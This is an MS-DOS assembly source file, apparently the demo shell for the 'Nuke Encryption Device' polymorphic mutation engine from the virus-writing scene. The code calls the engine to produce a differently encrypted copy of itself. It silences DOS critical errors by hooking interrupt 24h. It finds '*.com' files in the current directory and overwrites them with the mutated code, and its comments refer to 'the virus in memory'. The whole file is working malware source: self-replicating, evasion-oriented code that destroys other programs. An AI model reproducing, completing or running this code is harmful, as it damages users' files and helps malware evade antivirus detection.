

.model tiny
.code
		org	0100h

extrn		ned_end:abs
extrn		nuke_enc_dev:near

; This bit here (main) is just a demonstration shell to show off N.E.D's
; capabilities.  Every time this file is executed, it will be encrypted
; with a totally different encryption scheme.

main		proc	near
		call	there
there:		pop	bp
		sub	bp,offset there

int24_vector_hook:
                mov     ax,3524h
                int     21h
                mov     word ptr [bp+stash_box],bx
                mov     word ptr [bp+stash_box+2],es
                mov     ah,25h
                lea     dx,[bp+offset int24]
                int     21h
                push    cs
                pop     es


                mov     ah,09h
		lea	dx,[bp + start_message]
		int	021h

; Arguments:    AX = offset of buffer to hold data
;               BX = offset of code start
;		CX = offset of the virus in memory (next time around!)
;		DX = length of code to copy and encrypt
;		SI = options:
;			bit 0:	dummy instructions
;			bit 1:	MOV variance
;			bit 2:  ADD/SUB substitution
;			bit 3:  garbage code
;			bit 4:  don't assume DS = CS
;			bits 5-15:  reserved
;
; Returns:	AX = size of generated decryption routine and encrypted code

ned:            lea     ax,[bp + ned_end]
		lea	bx,[bp + main]
		mov	cx,0100h
		mov	dx,end_of_code - main
		mov	si,0000000000001111b
		call	nuke_enc_dev
		push	ax

                mov     ah,4eh
                lea     dx,gimme1
                int     21h

                mov     ah,3DH
                mov     dx,[bp+09eh]
		int	021h
                xchg    bx,ax

		pop	cx
                mov     ah,040h
		lea	dx,[bp + ned_end]
		int	021h

		mov	ah,040h
		xor	cx,cx
		int	021h

		mov	ah,03Eh
		int	021h

		mov	ah,09h
		lea	dx,[bp + end_message]
		int	021h

                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di

                mov     ah,4fh
                mov     dx,offset gimme1
                mov     cx,2
                int     21h

                mov     ax,04C00h
		int	021h

int24:
                mov     al,3
                iret

stash_box       db      ?
gimme1          db      '*.com',0
start_message	db	"Beginning mutation...","$"
end_message	db	"mutation successful!",13,10,"$"
main		endp

end_of_code	label	near

		end	main

